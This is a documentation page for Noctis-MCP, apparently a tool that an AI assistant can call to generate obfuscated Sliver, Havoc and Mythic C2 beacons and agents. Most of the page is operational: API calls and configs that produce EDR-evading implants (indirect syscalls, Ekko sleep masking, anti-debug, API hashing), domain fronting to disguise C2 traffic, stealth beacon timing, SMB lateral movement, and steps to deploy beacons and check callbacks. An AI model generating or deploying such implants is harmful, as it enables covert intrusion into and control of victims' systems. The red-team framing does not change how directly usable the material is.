# C2 Integration

Complete guide for integrating Noctis-MCP with C2 frameworks.

## Overview

Noctis-MCP supports three major C2 frameworks:

| Framework | Protocols | Features | Status |
|-----------|-----------|----------|--------|
| **Sliver** | HTTPS, DNS, mTLS, TCP | Beacon/Session modes, cross-platform | Production |
| **Havoc** | HTTPS, HTTP, SMB | Sleep obfuscation, indirect syscalls | Production |
| **Mythic** | HTTPS, HTTP, WebSocket, DNS, SMB | Multi-agent, modular profiles | Production |

---

## Sliver C2

### Installation

**Quick Install (Linux):**
```bash
# Official installer
curl https://sliver.sh/install | sudo bash

# Verify installation
sliver-server version
```

**Manual Install:**
```bash
# Download latest release
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux
sudo mv sliver-server_linux /usr/local/bin/sliver-server

# Download client
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux
chmod +x sliver-client_linux
sudo mv sliver-client_linux /usr/local/bin/sliver-client
```

### Starting Sliver Server

```bash
# Start multiplayer server
sliver-server

# Or daemon mode
sliver-server daemon

# Connect with client
sliver-client
```

### Create Listener

```bash
# HTTPS listener
sliver > https --lhost 192.168.1.100 --lport 443

# DNS listener
sliver > dns --domains example.com --lhost 192.168.1.100

# mTLS listener
sliver > mtls --lhost 192.168.1.100 --lport 8888
```

### Generate Beacon with Noctis

**Python API:**
```python
from c2_adapters import generate_sliver_beacon

result = generate_sliver_beacon(
    listener_host="192.168.1.100",
    listener_port=443,
    protocol="https",
    architecture="x64",
    techniques=["NOCTIS-T124", "NOCTIS-T118"],
    obfuscate=True
)

print(f"Beacon: {result.beacon_path}")
print(f"OPSEC Score: {result.opsec_score}/10")
```

**REST API:**
```bash
curl -X POST http://localhost:5000/api/c2/sliver/generate \
  -H "Content-Type: application/json" \
  -d '{
    "listener_host": "192.168.1.100",
    "listener_port": 443,
    "protocol": "https",
    "architecture": "x64",
    "techniques": ["NOCTIS-T124"],
    "obfuscate": true
  }'
```

**AI Chat:**
```
generate_sliver_beacon(
    listener_host="192.168.1.100",
    listener_port=443,
    protocol="https",
    obfuscate=True
)
```

### Sliver Protocols

**HTTPS:**
- Default and recommended
- Port 443 (looks like normal web traffic)
- TLS encryption
- Domain fronting capable

**DNS:**
- Excellent for restrictive networks
- Port 53 (DNS traffic rarely blocked)
- Requires domain control
- Slower but stealthy

**mTLS:**
- Mutual TLS authentication
- Most secure option
- Custom port
- Best for known infrastructure

**TCP:**
- Raw TCP connection
- Custom port
- Fast but less stealthy
- Good for internal networks

### Configuration Options

```python
from c2_adapters.config import SliverConfig, Protocol, Architecture

config = SliverConfig(
    listener_host="c2.example.com",
    listener_port=443,
    protocol=Protocol.HTTPS,
    architecture=Architecture.X64,
    
    # Beacon configuration
    beacon_interval=60,  # seconds
    beacon_jitter=30,    # percent
    
    # Connection
    max_connection_errors=3,
    reconnect_interval=5,
    
    # Output format
    output_format=OutputFormat.SHELLCODE,
    
    # Noctis obfuscation
    obfuscate_strings=True,
    obfuscate_apis=True,
    encryption_method="aes",
    hash_method="djb2"
)
```

### Troubleshooting Sliver

**Server won't start:**
```bash
# Check if already running
ps aux | grep sliver

# Kill old process
pkill sliver-server

# Check port availability
netstat -tuln | grep 31337

# Restart server
sliver-server
```

**Client can't connect:**
```bash
# Generate new operator config
sliver > new-operator --name operator1 --lhost 127.0.0.1

# Import config on client machine
sliver-client import operator1.cfg
```

**Beacon not calling back:**
- Check firewall rules
- Verify listener is active: `sliver > jobs`
- Check beacon logs on target
- Test connectivity: `telnet c2-server 443`

---

## Havoc C2 ⚠️ Manual Generation Required

> **⚠️ IMPORTANT: Havoc Service API Not Yet Available**
> 
> The Havoc Service API is currently in development and not yet released.  
> See: https://havocframework.com/docs/service_api (Status: Coming Soon)
> 
> **Current Status:**
> - ❌ Automated demon generation: Not available
> - ✅ Manual demon generation: Via GUI client
> - ✅ Noctis obfuscation: Can be applied to manually generated demons
> 
> This integration will be updated to full automation once Havoc releases their Service API.

### Installation

**Quick Install (Ubuntu/Debian):**
```bash
# Clone repository
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Install dependencies
sudo apt install -y git build-essential cmake libssl-dev \
    libqt5websockets5-dev qtbase5-dev

# Build
make

# Binaries in: Havoc/Client/Build/ and Havoc/Teamserver/Build/
```

**Manual Build:**
```bash
# Client
cd Client
cmake -S . -B Build
cmake --build Build

# Teamserver
cd ../Teamserver
go build -o teamserver main.go
```

### Starting Havoc Teamserver

```bash
# Create profile
cat > profiles/havoc.yaotl << 'EOF'
Teamserver:
  Host: "0.0.0.0"
  Port: 40056
  
Listeners:
  - Name: "HTTPS Listener"
    Protocol: "https"
    Hosts:
      - "192.168.1.100"
    Port: 443
    
Demon:
  SleepTechnique: "Ekko"
  IndirectSyscalls: true
  StackDuplication: true
EOF

# Start teamserver
./teamserver server --profile ./profiles/havoc.yaotl

# Start client
./client
```

### Manual Demon Generation (Current Method)

> **⚠️ Service API Not Available - Manual Generation Required**

**Step 1: Generate Demon via GUI**
```bash
# Start teamserver
cd Havoc/teamserver
sudo ./teamserver server --profile profiles/havoc.yaotl -v

# In another terminal, start GUI client
cd Havoc/Client/Build
./Havoc
```

**Step 2: Configure Demon in GUI:**
- Listener: HTTPS on 192.168.1.100:443
- Architecture: x64
- Format: Shellcode (for obfuscation)
- Sleep Technique: Ekko
- Enable indirect syscalls
- Enable stack duplication

**Step 3: Export & Apply Noctis Obfuscation:**
```python
# After exporting demon.bin from GUI
from server.obfuscation.string_encryption import StringEncryptor
from server.obfuscation.api_hashing import APIHasher

# This will be automated when Havoc API is released
```

**REST API:**
```bash
curl -X POST http://localhost:5000/api/c2/havoc/generate \
  -H "Content-Type: application/json" \
  -d '{
    "listener_host": "192.168.1.100",
    "listener_port": 443,
    "protocol": "https",
    "architecture": "x64",
    "sleep_technique": "Ekko",
    "techniques": ["NOCTIS-T124"],
    "obfuscate": true,
    "indirect_syscalls": true,
    "stack_duplication": true
  }'
```

### Havoc Sleep Obfuscation

**Ekko:**
- Most advanced sleep obfuscation
- Hides call stack during sleep
- Uses ROP chain
- Highly evasive

**Foliage:**
- Alternative sleep technique
- Stack encryption
- Good OPSEC
- Windows 10+ only

**WaitForSingleObjectEx:**
- Standard Windows sleep
- Less evasive
- Most compatible
- Fallback option

### Havoc Protocols

**HTTPS:**
- Primary protocol
- TLS encryption
- Port 443
- Malleable profiles

**HTTP:**
- Non-encrypted
- Port 80
- Faster but less secure
- Good for internal testing

**SMB:**
- Named pipes
- Excellent for lateral movement
- Port 445
- Peer-to-peer capable

### Configuration Options

```python
from c2_adapters.config import HavocConfig

config = HavocConfig(
    listener_host="c2.example.com",
    listener_port=443,
    protocol="https",
    
    # Sleep obfuscation
    sleep_technique="Ekko",
    sleep_mask=True,
    
    # EDR evasion
    indirect_syscalls=True,
    stack_duplication=True,
    proxy_loading=True,
    
    # Encryption
    encryption_key="my-secret-key",
    encryption_type="aes256",
    
    # Noctis obfuscation
    obfuscate=True,
    techniques=["NOCTIS-T124", "NOCTIS-T118"]
)
```

### Troubleshooting Havoc

**Teamserver won't start:**
```bash
# Check dependencies
ldd ./teamserver

# Check port
netstat -tuln | grep 40056

# Check profile syntax
./teamserver check --profile ./profiles/havoc.yaotl
```

**Client can't connect:**
```bash
# Verify teamserver is running
ps aux | grep teamserver

# Check firewall
sudo ufw allow 40056/tcp

# Test connectivity
telnet 192.168.1.100 40056
```

**Demon not checking in:**
- Verify listener is active in Havoc UI
- Check demon sleep interval
- Review teamserver logs
- Test network connectivity from target

---

## Mythic C2

### Installation

**Quick Install (Ubuntu/Debian):**
```bash
# Clone repository
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic

# Install Docker dependencies
sudo ./install_docker_ubuntu.sh

# Start Mythic
sudo ./mythic-cli start

# Access UI: https://127.0.0.1:7443
# Default credentials shown in terminal output
```

**Manual Installation:**
```bash
# Install Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# Install Docker Compose
sudo apt install docker-compose

# Clone and start
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic
sudo docker-compose up -d
```

### Starting Mythic

```bash
# Start all services
sudo ./mythic-cli start

# Stop services
sudo ./mythic-cli stop

# View logs
sudo ./mythic-cli logs

# Install agent
sudo ./mythic-cli install github https://github.com/MythicAgents/apollo.git
```

### Get API Token

```bash
# Access Mythic UI
https://127.0.0.1:7443

# Login with credentials from terminal
# Navigate to: Settings → API Tokens
# Generate new token
# Copy token for Noctis-MCP
```

### Generate Agent with Noctis

**Python API:**
```python
from c2_adapters import generate_mythic_agent

result = generate_mythic_agent(
    listener_host="192.168.1.100",
    listener_port=80,
    api_token="your_api_token_here",
    agent_type="apollo",  # or "poseidon", "merlin", "apfell", "atlas"
    c2_profile="http",
    architecture="x64",
    techniques=["NOCTIS-T124"],
    obfuscate=True
)

print(f"Agent: {result.beacon_path}")
print(f"OPSEC Score: {result.opsec_score}/10")
```

**REST API:**
```bash
curl -X POST http://localhost:5000/api/c2/mythic/generate \
  -H "Content-Type: application/json" \
  -d '{
    "listener_host": "192.168.1.100",
    "listener_port": 80,
    "api_token": "your_api_token_here",
    "agent_type": "apollo",
    "c2_profile": "http",
    "architecture": "x64",
    "techniques": ["NOCTIS-T124"],
    "obfuscate": true
  }'
```

### Mythic Agent Types

**Apollo:**
- Windows agent
- .NET based
- Most features
- Recommended for Windows

**Poseidon:**
- Cross-platform (Windows, Linux, macOS)
- Golang agent
- Good portability
- Modern codebase

**Merlin:**
- HTTP/2 protocol
- Excellent OPSEC
- Cross-platform
- Difficult to detect

**Apfell:**
- macOS/Linux agent
- JavaScript/Python
- Native macOS features
- Best for Apple targets

**Atlas:**
- Windows C++ agent
- High performance
- Low footprint
- Advanced features

### Mythic C2 Profiles

**HTTP:**
- Standard HTTP
- Port 80/8080
- Fast and simple
- Good for testing

**HTTPS:**
- TLS encrypted
- Port 443
- Production ready
- Recommended

**WebSocket:**
- Persistent connection
- Real-time communication
- Good for interactive shells
- Modern browsers

**DNS:**
- DNS tunneling
- Port 53
- Excellent for restrictive networks
- Requires domain

**SMB:**
- Named pipes
- Port 445
- Peer-to-peer
- Lateral movement

### Configuration Options

```python
from c2_adapters.config import MythicConfig

config = MythicConfig(
    # Connection
    listener_host="c2.example.com",
    listener_port=443,
    protocol="https",
    api_key="your_api_token",
    
    # Agent
    payload_type="apollo",
    c2_profile="https",
    
    # Build parameters
    build_parameters={
        "obfuscation": True,
        "anti_debug": True,
        "architecture": "x64"
    },
    
    # Commands to include
    commands=["shell", "upload", "download", "screenshot"],
    
    # Encryption
    encrypted_exchange_check=True,
    crypto_type="aes256_hmac",
    
    # Noctis techniques
    techniques=["NOCTIS-T124", "NOCTIS-T118"]
)
```

### Troubleshooting Mythic

**Services won't start:**
```bash
# Check Docker
sudo systemctl status docker

# Start Docker
sudo systemctl start docker

# Check Mythic status
sudo ./mythic-cli status

# View logs
sudo ./mythic-cli logs
```

**Can't access UI:**
```bash
# Check if services are running
sudo docker ps

# Restart Mythic
sudo ./mythic-cli restart

# Check firewall
sudo ufw allow 7443/tcp
```

**API token invalid:**
- Generate new token in UI
- Verify token in API calls
- Check token hasn't expired
- Use correct Bearer format

---

## Comparison Matrix

| Feature | Sliver | Havoc | Mythic |
|---------|--------|-------|--------|
| **Platform** | Cross-platform | Windows | Cross-platform |
| **Language** | Go | C/C++ | Python/Docker |
| **Protocols** | 5 | 3 | 5 |
| **Sleep Obfuscation** | Standard | Advanced (Ekko/Foliage) | Standard |
| **OPSEC Features** | Good | Excellent | Good |
| **Ease of Setup** | Easy | Medium | Medium |
| **Documentation** | Excellent | Good | Excellent |
| **Community** | Large | Growing | Large |
| **Best For** | General purpose | Windows red teams | Enterprise ops |

---

## Best Practices

### Network Segmentation

```
Target Network
      ↓
  Beacon/Demon
      ↓
Redirector/CDN
      ↓
   C2 Server
```

### Domain Fronting

```python
# Sliver with domain fronting
result = generate_sliver_beacon(
    listener_host="cdn.cloudflare.com",  # CDN endpoint
    listener_port=443,
    protocol="https",
    # Actual C2 in HTTP Host header
    domain_fronting=True
)
```

### Beacon Intervals

Recommended intervals for different scenarios:

| Scenario | Interval | Jitter |
|----------|----------|--------|
| **Active Op** | 5-30s | 20% |
| **Persistence** | 5-60m | 50% |
| **Stealth** | 1-24h | 80% |

### OPSEC Checklist

- [ ] Use HTTPS/mTLS for encryption
- [ ] Enable Noctis obfuscation
- [ ] Set reasonable beacon intervals
- [ ] Use redirectors
- [ ] Test in isolated environment first
- [ ] Monitor for anomalies
- [ ] Clean up artifacts after ops

---

## Integration Testing

### Test Sliver Integration

```bash
# Start Sliver server
sliver-server &

# Create listener
sliver-client -c "https --lhost 127.0.0.1 --lport 8443"

# Generate beacon
python -c "
from c2_adapters import generate_sliver_beacon
result = generate_sliver_beacon('127.0.0.1', 8443, 'https')
print(result.beacon_path)
"

# Deploy beacon and verify callback
```

### Test Havoc Integration

```bash
# Start teamserver
./havoc server --profile ./profiles/havoc.yaotl &

# Generate demon
python -c "
from c2_adapters import generate_havoc_demon
result = generate_havoc_demon('127.0.0.1', 443, 'https', sleep_technique='Ekko')
print(result.beacon_path)
"

# Check Havoc UI for callback
```

### Test Mythic Integration

```bash
# Start Mythic
sudo ./mythic-cli start

# Get API token from UI
# Generate agent
python -c "
from c2_adapters import generate_mythic_agent
result = generate_mythic_agent('127.0.0.1', 80, api_token='YOUR_TOKEN', agent_type='apollo')
print(result.beacon_path)
"

# Monitor Mythic dashboard
```

---

## Resources

### Sliver
- **Official Site**: https://sliver.sh
- **GitHub**: https://github.com/BishopFox/sliver
- **Documentation**: https://github.com/BishopFox/sliver/wiki
- **Discord**: https://discord.gg/bishopfox

### Havoc
- **GitHub**: https://github.com/HavocFramework/Havoc
- **Documentation**: https://havocframework.com/docs
- **Discord**: https://discord.gg/havoc

### Mythic
- **GitHub**: https://github.com/its-a-feature/Mythic
- **Documentation**: https://docs.mythic-c2.net
- **Discord**: https://discord.gg/mythic
- **YouTube**: Search "Mythic C2 tutorial"

---

**Last Updated**: October 3, 2025  
**Version**: 1.0.0

